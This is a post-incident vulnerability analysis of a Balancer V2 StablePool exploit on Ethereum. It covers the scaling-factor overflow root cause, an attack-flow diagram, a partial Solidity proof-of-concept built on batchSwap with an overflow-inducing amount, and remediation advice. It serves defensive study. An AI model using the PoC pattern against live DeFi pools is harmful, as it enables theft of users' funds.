# BalancerV2 — StableMath Overflow Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2025-11-05 |
| **Protocol** | Balancer V2 (StablePool) |
| **Chain** | Ethereum |
| **Loss** | ~120,000,000 USD |
| **Attacker** | [0x506d1f9efe24f0d47853adca907eb8d89ae03207](https://etherscan.io/address/0x506d1f9efe24f0d47853adca907eb8d89ae03207) |
| **Attack Tx** | [0x6ed07db1...](https://app.blocksec.com/explorer/tx/eth/0x6ed07db1a9fe5c0794d44cd36081d6a6df103fab868cdd75d581e3bd23bc9742) |
| **Vulnerable Contract** | Balancer StablePool (osETH/wETH, wstETH/wETH) |
| **Root Cause** | Scaling factor manipulation in `swapGivenOut` calculation within StableMath induces arithmetic overflow |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-11/BalancerV2_exp.sol) |

---

## 1. Vulnerability Overview

Balancer V2's StablePool uses stable swap mathematics (StableMath) to calculate token exchange rates. The attacker manipulated the scaling factor in the internal calculations of the `swapGivenOut` function to induce arithmetic overflow, thereby executing swaps at extremely favorable exchange rates. A total of $120 million USD was drained from the osETH/wETH and wstETH/wETH pools, making this the largest hack in Balancer's history.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable pattern: overflow via scaling factor manipulation in swapGivenOut
function swapGivenOut(
    uint256[] memory balances,
    uint256 tokenIndexIn,
    uint256 tokenIndexOut,
    uint256 tokenAmountOut,
    uint256 amplificationParameter
) internal pure returns (uint256) {
    // When the scaling factor can be manipulated externally,
    // overflow occurs in internal numeric calculations → incorrect amountIn returned
    uint256 scaledAmountOut = tokenAmountOut * scalingFactor;
    // → If scalingFactor is extremely large, overflow wraps to a small value
    // → amountIn is calculated as abnormally small
    return _getTokenBalanceGivenInvariantAndAllOtherBalances(...);
}

// ✅ Fix direction: upper-bound validation on scaling factor + SafeMath
function swapGivenOut(...) internal pure returns (uint256) {
    require(scalingFactor <= MAX_SCALING_FACTOR, "scaling factor overflow");
    uint256 scaledAmountOut = tokenAmountOut.mulDown(scalingFactor); // SafeMath
    ...
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─[1]─▶ Accumulate large amounts of osETH and wstETH (or flash loan)
  │
  ├─[2]─▶ Trigger manipulated scaling factor in Balancer StablePool
  │         └─ Manipulate rebase or rate provider
  │
  ├─[3]─▶ Call swapGivenOut (osETH/wETH pool)
  │         └─ Overflow causes amountIn = extremely small value
  │             Receives large amount of wETH in return
  │
  ├─[4]─▶ Attack wstETH/wETH pool with the same pattern
  │
  ├─[5]─▶ Transfer received wETH to beneficiary address
  │
  └─[6]─▶ Final fund withdrawal via separate withdrawal Tx
              └─ ~120,000,000 USD drained
```

## 4. PoC Code (Core Logic + Comments)

```solidity
function testPoC() public {
    // Check beneficiary balance before attack
    emit log_named_decimal_uint("before: wETH balance",
        IERC20(weth).balanceOf(address(beneficiary)), 18);

    // [1] Call swapGivenOut with manipulated scaling factor
    // trickAmt: specially computed value that induces overflow
    uint256 trickAmt = get_trickAmt(scalingFactor);

    // [2] Execute manipulated swap via Balancer's batchSwap
    // amountIn becomes extremely small due to overflow → receive large output token amount
    IBalancerVault(balancer).batchSwap(
        IBalancerVault.SwapKind.GIVEN_OUT,
        concat_steps(trickAmt),  // multi-hop swap path
        assets,
        funds,
        limits,
        block.timestamp
    );
}

// Calculate trickAmt that induces overflow
function get_trickAmt(uint256 scalingfactor) public pure returns (uint256 trickAmt) {
    // Returns the value at which StableMath internal calculations overflow for a given scaling factor
    trickAmt = (type(uint256).max / scalingfactor) + 1;
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Arithmetic Overflow |
| **Attack Vector** | Scaling factor manipulation + StableMath overflow |
| **Impact Scope** | Full drainage of StablePool liquidity |
| **CWE** | CWE-190: Integer Overflow |
| **DASP Classification** | Arithmetic / Mathematical Vulnerability |

## 6. Remediation Recommendations

1. **Enforce scaling factor upper bound**: Set a safe maximum value on scaling factors returned by rate providers.
2. **Apply SafeMath throughout**: Use safe math libraries that include overflow checks for all arithmetic operations.
3. **Invariant verification**: Verify that the pool's invariant is preserved before and after each swap.
4. **Rate Provider auditing**: Strictly limit and validate the range of values returned by external rate providers.

## 7. Lessons Learned

- This is one of the largest hacks in DeFi history, demonstrating that edge cases in complex math libraries can lead to catastrophic outcomes.
- Values that can be influenced externally — such as scaling factors — must always be range-validated before being used in internal mathematical calculations.
- Even code that has passed formal audits can exhibit unexpected overflow behavior under specific combinations of input values.